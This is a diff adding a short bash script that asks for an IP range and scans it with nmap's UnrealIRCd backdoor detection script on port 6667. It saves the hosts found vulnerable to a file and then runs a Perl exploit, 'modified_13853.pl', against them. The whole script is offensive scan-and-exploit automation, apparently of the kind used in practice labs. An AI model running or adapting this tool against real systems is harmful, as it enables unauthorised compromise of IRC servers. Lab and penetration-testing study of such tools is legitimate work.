@@ -1,0 +1,28 @@
+#!/bin/bash
+
+	echo
+	echo -e "\x1B[1;33m
+                 __   __                __
+	|  ||\ ||__| |__ /\ |   |_| /\ |  |_/
+	|__|| \||  \_|__/  \|__ | |/  \|__| \_
+
+	By Carter Thomas\x1B[0m"
+	echo
+	echo
+
+echo "Enter the IP Range to scan: "
+read ip
+#for ip in $i; do nmap -v -T4 --script=irc-unrealircd-backdoor.nse $i --open; done
+current_user=$(whoami)
+nmap -v -T4 --script=irc-unrealircd-backdoor.nse -p 6667 $ip --open > /$current_user/testscan.txt
+
+v=$(grep "irc-unrealircd-backdoor" /$current_user/testscan.txt)
+if [ -z "$v" ]; then
+      echo "[+] Machine is not vulnerable";
+      #else vuln_port=$(cat /$current_user/testcan.txt | grep -B 1 "irc-unrealircd-backdoor" | grep "irc" | cut -d "/" -f 1)      
+      else vuln_ip=$(cat /$current_user/testscan.txt | grep -B 4 "irc-unrealircd-backdoor" | grep "Nmap scan" | cut -d " " -f 5)
+echo "[+] Vulnerable IPs have been stored in /root/vulnerable_ip.txt"
+echo $vuln_ip | sed 's/ /\n/g' > /$current_user/vulnerable_ip.txt
+echo "[+] Exploiting target $vuln_ip"
+perl modified_13853.pl $vuln_ip 6667
+fi
